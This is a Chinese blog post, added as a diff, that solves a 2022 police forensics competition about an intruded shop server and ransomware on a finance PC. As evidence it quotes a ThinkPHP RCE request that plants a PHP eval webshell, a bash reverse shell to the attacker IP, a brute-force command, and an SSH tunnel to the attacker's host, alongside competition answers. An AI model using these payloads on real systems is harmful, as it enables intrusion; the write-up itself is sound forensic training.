@@ -1,0 +1,510 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>22台州比武 | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2022年台州公安电子数据取证分析大比武作业指导书背景介绍:某月某日，县公安局接某公司财务部门报警，称其官网及财务报销系统疑被入侵，且攻击者在财务报销系统中投放了勒索病毒，现已无法运行，且服务器内的重要文件均被加密。县公安局网安大队高度重视，立即根据受害人的反馈对该被入侵服务器进行取证，初步确定了作案手法：这是一次来自互联网的网络攻击，攻击者利用多种漏洞获取到服务器的权限，并投放了勒索病毒对服务器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="22台州比武">
+<meta property="og:url" content="https://xyaxxya.github.io/2024/03/18/22%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/index.html">
+<meta property="og:site_name" content="Yiyi">
+<meta property="og:description" content="2022年台州公安电子数据取证分析大比武作业指导书背景介绍:某月某日，县公安局接某公司财务部门报警，称其官网及财务报销系统疑被入侵，且攻击者在财务报销系统中投放了勒索病毒，现已无法运行，且服务器内的重要文件均被加密。县公安局网安大队高度重视，立即根据受害人的反馈对该被入侵服务器进行取证，初步确定了作案手法：这是一次来自互联网的网络攻击，攻击者利用多种漏洞获取到服务器的权限，并投放了勒索病毒对服务器">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/02/20/hOrdmDQnvzAoTHM.png">
+<meta property="article:published_time" content="2024-03-18T15:42:38.000Z">
+<meta property="article:modified_time" content="2024-03-22T14:20:40.352Z">
+<meta property="article:author" content="yiyi">
+<meta property="article:tag" content="PC">
+<meta property="article:tag" content="电子取证">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="服务器">
+<meta property="article:tag" content="exsi">
+<meta property="article:tag" content="反编译">
+<meta property="article:tag" content="流量">
+<meta property="article:tag" content="APK">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/02/20/hOrdmDQnvzAoTHM.png"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/2024/03/18/22%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '22台州比武',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-22 22:20:40'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/02/20/hOrdmDQnvzAoTHM.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">22台州比武</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-18T15:42:38.000Z" title="发表于 2024-03-18 23:42:38">2024-03-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-22T14:20:40.352Z" title="更新于 2024-03-22 22:20:40">2024-03-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/wp/">wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/03/18/22%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/" data-flag-title="22台州比武"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/03/18/22%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/03/18/22%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="2022年台州公安电子数据取证分析大比武作业指导书"><a href="#2022年台州公安电子数据取证分析大比武作业指导书" class="headerlink" title="2022年台州公安电子数据取证分析大比武作业指导书"></a>2022年台州公安电子数据取证分析大比武作业指导书</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍:"></a>背景介绍:</h2><p>某月某日，县公安局接某公司财务部门报警，称其官网及财务报销系统疑被入侵，且攻击者在财务报销系统中投放了勒索病毒，现已无法运行，且服务器内的重要文件均被加密。<br>县公安局网安大队高度重视，立即根据受害人的反馈对该被入侵服务器进行取证，初步确定了作案手法：这是一次来自互联网的网络攻击，攻击者利用多种漏洞获取到服务器的权限，并投放了勒索病毒对服务器进行加密，以勒索该公司。</p>
+<h2 id="检材一："><a href="#检材一：" class="headerlink" title="检材一："></a>检材一：</h2><p>你们是该案件的电子数据取证团队，通过对该公司的两台被入侵服务器进行定向采集磁盘镜像-检材一（WEB.E01），请分析该镜像，并回答以下问题：<br>1、请计算检材一(WEB.E01)镜像文件的SHA256哈希值为?（50分）（格式：大写）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ROG&gt;certutil -hashfile F:\2022年台州网安电子数据取证比武镜像文件\题目镜像\题目镜像\WEB.E01 sha256</span><br><span class="line">SHA256 的 F:\2022年台州网安电子数据取证比武镜像文件\题目镜像\题目镜像\WEB.E01 哈希:</span><br><span class="line">25577741a65ed32a8605bd05ebde0cd6e255c2226cdf3a92a876d51850c8c266</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p>2、该服务器的操作系统的内核版本为？（100分）（参考格式：5.89.5-xxxx）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# uname -a</span><br><span class="line">Linux localhost.localdomain 3.10.0-514.el7.x86_64 #1 SMP Tue Nov 22 16:42:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<p>3、该服务器IP地址为?（250分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.100</span><br></pre></td></tr></table></figure>
+
+<p>4、该服务器的放通了哪几个HTTP服务端口？（100分）（参考格式：80,7071,8080，按数值从小到大排列）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# netstat -lnpt|grep nginx</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      3348/nginx: master  </span><br><span class="line">tcp        0      0 0.0.0.0:888             0.0.0.0:*               LISTEN      3348/nginx: master  </span><br></pre></td></tr></table></figure>
+
+<p>5、该服务器的数据库版本号为?（100分）（参考格式：8.9.5-log）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.6.50-log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# mysql --version</span><br><span class="line">mysql  Ver 14.14 Distrib 5.6.50, for Linux (x86_64) using  EditLine wrapper</span><br></pre></td></tr></table></figure>
+
+<p>6、该网站(商城)所使用的Nginx配置文件名为？（150分）（参考格式：config.json）</p>
+<p><img src="https://pic.imgdb.cn/item/65f6fea99f345e8d03e8f875.png"></p>
+<p>7、该服务器的服务器管理面板地址为？（150分）（参考格式 ：<a target="_blank" rel="noopener" href="http://127.0.0.1/test%EF%BC%89">http://127.0.0.1/test）</a></p>
+<p>配置虚拟网卡符合所给ip</p>
+<p><img src="https://pic.imgdb.cn/item/65f7008c9f345e8d03f41a44.png"></p>
+<p>8、该服务器中搭建了几个网站？（格式 ：数字）（150分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>9、该服务器中存在的几个网站，请分别写出网站域名？（200分）（格式：<a target="_blank" rel="noopener" href="http://www.baidu.com,www.google.com,按b小于g的顺序填写)/">www.baidu.com,www.google.com，按b小于g的顺序填写）</a></p>
+<p><img src="https://pic.imgdb.cn/item/65f6fefd9f345e8d03eaeea8.png"></p>
+<p>10、请分析是哪个网站遭到入侵，该网站的后台登陆URL地址为？（200分）（格式为域名+路径，比如：<a target="_blank" rel="noopener" href="http://www.baidu.com/test%EF%BC%89">www.baidu.com/test）</a></p>
+<p>两个网站</p>
+<p><img src="https://pic.imgdb.cn/item/65f701409f345e8d03f84d48.png"></p>
+<p><img src="https://pic.imgdb.cn/item/65f701519f345e8d03f8ad5d.png"></p>
+<p>查看网站日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222.2.2.2 - - [04/Mar/2022:15:15:13 +0800] &quot;GET /?s=/admin/\x5Cthink\x5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=peiqi.php&amp;vars[1][]=&lt;?php%20@eval($_POST[%27peiqi%27])?&gt; HTTP/1.1&quot; 200 12 &quot;-&quot; &quot;Java/11.0.13&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f703749f345e8d03061209.png"></p>
+<p>11、攻击者的IP地址是多少？（250分）（格式：255.255.255.1）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222.2.2.2</span><br></pre></td></tr></table></figure>
+
+<p>同上</p>
+<p>12、攻击者成功写入了一句话木马的时间为？（250分）（格式：2021-01-01 01:01:01）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2022-03-04 15:15:13</span><br></pre></td></tr></table></figure>
+
+<p>同上</p>
+<p>13、据公司管理员描述，该网站运行期间一直开启着流量抓包程序，请尝试寻找网络数据包，计算网络数据包的SHA256哈希值？（100分）（格式:大写）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost wwwlogs]# sha256sum /root/tcpdump.cap</span><br><span class="line">9750f305800ca07927c5aa89519885e63ae5d3331ef33ff53460cb2c82bde8b1  /root/tcpdump.cap</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>14、通过对数据包进行分析，发现违法攻击者使用什么工具对内网进行了扫描，该工具的SHA256哈希值为？（100分）（格式:大写）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 04 Mar 2022 07:18:29 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line"></span><br><span class="line">279919---------------------------------------------------------------------------------------------</span><br><span class="line">				  ____  ____  ____  ____ </span><br><span class="line">				 / __ `/ __ \/ __ \/ __ \</span><br><span class="line">				/ /_/ / /_/ / /_/ / / / /</span><br><span class="line">				\__, /\____/\____/_/ /_/</span><br><span class="line">				/___/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					goon v3</span><br><span class="line">					by:i11us0ry</span><br><span class="line">---------------------------------------------------------------------------------------------                                                    </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">[Info]::    | 2022/03/04 15:18:29 ..............................</span><br><span class="line"></span><br><span class="line">[Error]::   | 2022/03/04 15:18:29 GMrPnWHsOEXYZUBBykmgaF:119: you should input -ip or -url or -ifile or -mode!</span><br><span class="line"></span><br><span class="line">......mode......:</span><br><span class="line"></span><br><span class="line">all:		............,......ip-port(web)-title-finger-ftp-ms17010-mssql-mysql-postgres-redis-ssh-smb-rdp-telnet-netbios</span><br><span class="line">webscan:	......ip-port(web)-title-finger</span><br><span class="line">brute:		......ip-ftp-ms17010-mssql-mysql-postgres-redis-ssh-smb-rdp-telnet</span><br><span class="line">ip:		ip......,......-np...............</span><br><span class="line">port:		............,......-web............http/https</span><br><span class="line">fofa:		fofa............,......-web......host.........http(fields............host..................)</span><br><span class="line">title:		title</span><br><span class="line">finger:		web......</span><br><span class="line">dir:		...............</span><br><span class="line">back:		..................</span><br><span class="line">tomcat:		tomcat..................url......http://127.0.0.1:8080...http://127.0.0.1:8080/manager/html</span><br><span class="line">ftp:		ftp......,......ms17010,mssql,mysql,postgres,redis,ssh,smb,rdp,telnet......</span><br><span class="line">netbios:	netbios......</span><br><span class="line"></span><br><span class="line">...............-h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9f7dd</span><br><span class="line">/www/wwwroot/www.tpshop.com/application</span><br><span class="line">dea75af74315</span><br><span class="line">275991df55b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/wwwroot/www.tpshop.com/application</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f7074e9f345e8d031cde45.png"></p>
+<p>重要提醒:为防止作弊，15题-20题在提交答案前，参赛人员需主动举手向工作人员展示解题过程后方可提交，否则不得分。工作人员只负责核实解题过程是否真实，不负责答案是否准确。<br>15、攻击者使用哪个字典对内网服务器进行爆破，请提供该字典文件的SHA256哈希值？（100分）（格式：大写）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">7ed94db889./	2022-03-04 15:32:40	4096	0755</span><br><span class="line">../	2022-03-04 15:32:40	4096	0755</span><br><span class="line">admin/	2020-09-09 15:38:04	184	0755</span><br><span class="line">common/	2020-09-09 15:38:10	18	0755</span><br><span class="line">home/	2020-09-09 15:38:10	172	0755</span><br><span class="line">mobile/	2020-09-09 15:38:10	100	0755</span><br><span class="line">PwnKit-Exploit-main/	2022-03-04 15:30:58	166	0775</span><br><span class="line">.htaccess	2020-09-09 15:37:58	286	0755</span><br><span class="line">command.php	2020-09-09 15:37:58	736	0755</span><br><span class="line">common.php	2020-09-09 15:38:10	56353	0755</span><br><span class="line">config.php	2020-09-09 15:38:10	14004	0755</span><br><span class="line">database.php	2022-03-03 16:58:35	1919	0777</span><br><span class="line">function.php	2020-09-09 15:38:10	19941	0755</span><br><span class="line">route.php	2020-09-09 15:38:12	1308	0755</span><br><span class="line">tags.php	2020-09-09 15:38:12	1009	0755</span><br><span class="line">goon2_lin.zip	2022-03-04 15:17:12	7699192	0644</span><br><span class="line">goon2_lin	2022-02-21 16:54:44	17104418	0777</span><br><span class="line">conf.yml	2022-03-04 15:18:22	6087	0600</span><br><span class="line">result.txt	2022-03-04 15:31:57	640	0755</span><br><span class="line">PwnKit-Exploit-main.zip	2022-03-04 15:30:06	14174	0644</span><br><span class="line">FastPwds.txt	2022-03-04 15:32:40	4764	0644</span><br><span class="line">9d476f4f8567</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FastPwds.txt</span><br></pre></td></tr></table></figure>
+
+<p>16、请分析，黑客所使用的bash反弹shell命令为？（250分）（格式：bash xxxxxxxxxx&gt;&amp;1）</p>
+<p><img src="https://pic.imgdb.cn/item/65f70a319f345e8d032d41c6.png"></p>
+<p>去掉前两位base64解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;/www/wwwroot/www.tpshop.com&quot;;bash -i&gt;&amp; /dev/tcp/222.2.2.2/10000 0&gt;&amp;1;echo 1afceae50d5a;pwd;echo 989643de</span><br></pre></td></tr></table></figure>
+
+<p>17、攻击者是利用哪条命令对内网进行爆破，并且成功的？（250分）</p>
+<p>分组字节流-&gt;关键词：goon-&gt;一条条看</p>
+<p><img src="https://pic.imgdb.cn/item/65f70fea9f345e8d034c9419.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./goon2_lin -ip 192.168.100.254 -rdp -user administrator -pfile FastPwds.txt </span><br></pre></td></tr></table></figure>
+
+<p>18、攻击者是利用哪个提权漏洞获取root权限的？（200分）（格式：漏洞编号，比如CVE-2009-1233）</p>
+<p><img src="https://pic.imgdb.cn/item/65f710eb9f345e8d0351d0cf.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/wwwroot/www.tpshop.com/application/PwnKit-Exploit-main.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f7115c9f345e8d03546e80.png"></p>
+<p>19、在爆破成功后，攻击者是通过一种方式与内网服务器建立隧道，该隧道建立的命令为？（250分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CgfNR 0.0.0.0:22222:192.168.100.254:3389 root@222.2.2.2 -p33333</span><br></pre></td></tr></table></figure>
+
+<p>后面的kali中找到</p>
+<p><img src="https://pic.imgdb.cn/item/65f800fb9f345e8d0333d51b.png"></p>
+<p>20、接上题，该命令建立隧道后，攻击者可以在回连服务器的哪个端口访问到内网服务？（格式：8899）（150分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22222</span><br></pre></td></tr></table></figure>
+
+<p>同上题图</p>
+<h2 id="检材二"><a href="#检材二" class="headerlink" title="检材二"></a>检材二</h2><p>通过对检材一的分析，你们已经初步掌握了攻击者的攻击路径和攻击手法。接下来请对检材二（PC.E01）进行分析，并回答以下问题<br>21、该服务器的计算机名为？（50分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f786169f345e8d0368031a.png"></p>
+<p>22、攻击者登陆该服务器的时间为？（100分）（格式：2021-01-01 01:01:01） </p>
+<p>cmd-&gt;<code>compmgmt.msc</code></p>
+<p>筛选4624</p>
+<p><img src="https://pic.imgdb.cn/item/65f789549f345e8d036f30da.png"></p>
+<p>23、该服务器中存在一款用于管理检材一（WEB.E01）软件，请计算该软件主程序的SHA256哈希值？（100分）（格式：大写）</p>
+<p><img src="https://pic.imgdb.cn/item/65f789a69f345e8d036fe20d.png"></p>
+<p>24、请尝试通过分析该上题中管理软件获取检材一的密码？（150分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cse19981228</span><br></pre></td></tr></table></figure>
+
+<p>火眼</p>
+<p>25、请计算勒索病毒程序的SHA256哈希值？（100分）（格式：大写）</p>
+<p><img src="https://pic.imgdb.cn/item/65f78bd09f345e8d0374f40e.png"></p>
+<p>26、该勒索病毒是如何下载财务电脑上的，请分析后提交下载的链接？（250分）<br>（格式：<a target="_blank" rel="noopener" href="http://xxx.xx/test/%EF%BC%89">http://xxx.xx/test/）</a></p>
+<p><img src="https://pic.imgdb.cn/item/65f78c199f345e8d03759624.png"></p>
+<p>27、请分析勒索软件会加密哪些文件后缀名的文件？（200分）（格式:doc,pdf,…….，注意顺序）</p>
+<p>uncompyle6</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/renjian1994/article/details/132216147">https://blog.csdn.net/renjian1994/article/details/132216147</a></p>
+<p><img src="https://pic.imgdb.cn/item/65f7904d9f345e8d038075ae.png"></p>
+<p>28、请分析该勒索软件最终是通过什么算法对数据进行加密的？（200分）(格式特殊：提交前需举手报告)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">异或</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f7905e9f345e8d0380afce.png"></p>
+<p>29、请尝试解密文件销售额.txt，解密后的销售金额为？（150分）</p>
+<p>30、另外，我们在财务电脑中发现木马程序，可能是犯罪嫌疑人所留，请找到木马文件，并请计算木马文件的SHA256哈希值为？（100分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f790b59f345e8d0381d3e9.png"></p>
+<p>重要提醒:为防止作弊，31题-39题在提交答案前，参赛人员需主动举手向工作人员展示解题过程后方可提交，否则不得分。工作人员只负责核实解题过程是否真实，不负责答案是否准确。<br>31、该木马文件以什么方式进行开机自启动？（200分）（格式特殊：提交前需举手报告）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册表启动项</span><br></pre></td></tr></table></figure>
+
